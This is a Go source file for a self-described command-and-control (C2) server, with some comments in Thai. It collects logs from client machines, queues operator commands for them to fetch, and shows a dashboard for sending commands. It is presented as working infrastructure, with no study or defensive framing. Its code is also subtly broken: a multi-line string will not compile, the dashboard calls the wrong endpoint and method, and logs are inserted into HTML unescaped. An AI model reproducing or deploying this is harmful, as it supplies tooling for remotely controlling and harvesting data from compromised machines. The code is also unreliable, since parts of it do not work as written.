package main

import (
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"sync"
	"time"
)

var (
	clients   = make(map[string]*Client)
	mu        sync.Mutex
	lastCmd   = make(map[string]string) // เก็บคำสั่งล่าสุดที่จะส่งไปหา Client
)

type Client struct {
	ID         string    `json:"id"`
	LastActive time.Time `json:"last_active"`
	Logs       []string  `json:"logs"`
}

func init() {
	go func() {
		for {
			time.Sleep(5 * time.Second)
			// ลบ Client ที่เงียบไปนานๆ (Optional)
		}
	}()
}

func handleStream(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	body, _ := io.ReadAll(r.Body)
	defer r.Body.Close()

	clientID := r.Header.Get("X-Client-ID")
	if clientID == "" {
		clientID = "unknown-" + time.Now().Format("150405")
	}

	mu.Lock()
	if _, exists := clients[clientID]; !exists {
		clients[clientID] = &Client{ID: clientID, LastActive: time.Now()}
	}
	c := clients[clientID]
	c.LastActive = time.Now()
	c.Logs = append(c.Logs, string(body))
	mu.Unlock()

	fmt.Fprintf(w, "OK")
}

func handleCommand(w http.ResponseWriter, r *http.Request) {
	if r.Method != "GET" {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	clientID := r.URL.Query().Get("id")
	if clientID == "" {
		http.Error(w, "Missing ID", http.StatusBadRequest)
		return
	}

	mu.Lock()
	cmd := lastCmd[clientID]
	delete(lastCmd, clientID) // ลบคำสั่งหลังส่งแล้ว
	mu.Unlock()

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]string{"command": cmd})
}

func handleDashboard(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	html := `<html><body style="background:#111; color:#0f0; font-family:monospace;">
	<h1>C2 Dashboard</h1>
	<table border="1" width="100%">
	<tr><th>ID</th><th>Last Active</th><th>Logs</th><th>Send Command</th></tr>`

	for id, c := range clients {
		lastLog := "No logs yet"
		if len(c.Logs) > 0 {
			lastLog = c.Logs[len(c.Logs)-1]
		}
		html += fmt.Sprintf(`<tr>
			<td>%s</td>
			<td>%s</td>
			<td>%s</td>
			<td><input type="text" id="cmd-%s" placeholder="Enter command"> <button onclick="sendCmd('%s')">Send</button></td>
		</tr>`, id, c.LastActive.Format("15:04:05"), lastLog, id, id)
	}
	html += "</table>
	<script>
	function sendCmd(id) {
		var cmd = document.getElementById('cmd-'+id).value;
		fetch('/command?set=1&id='+id+'&cmd='+encodeURIComponent(cmd));
		alert('Command sent to '+id);
	}
	</script>
	</body></html>"
	fmt.Fprint(w, html)
}

func handleSetCommand(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	id := r.URL.Query().Get("id")
	cmd := r.URL.Query().Get("cmd")
	
	mu.Lock()
	lastCmd[id] = cmd
	mu.Unlock()
	
	fmt.Fprintf(w, "OK")
}

func main() {
	http.HandleFunc("/stream", handleStream)
	http.HandleFunc("/command", handleCommand)
	http.HandleFunc("/command/set", handleSetCommand)
	http.HandleFunc("/", handleDashboard)
	
	log.Println("Starting C2 Server on :8080...")
	log.Fatal(http.ListenAndServe(":8080", nil))
}
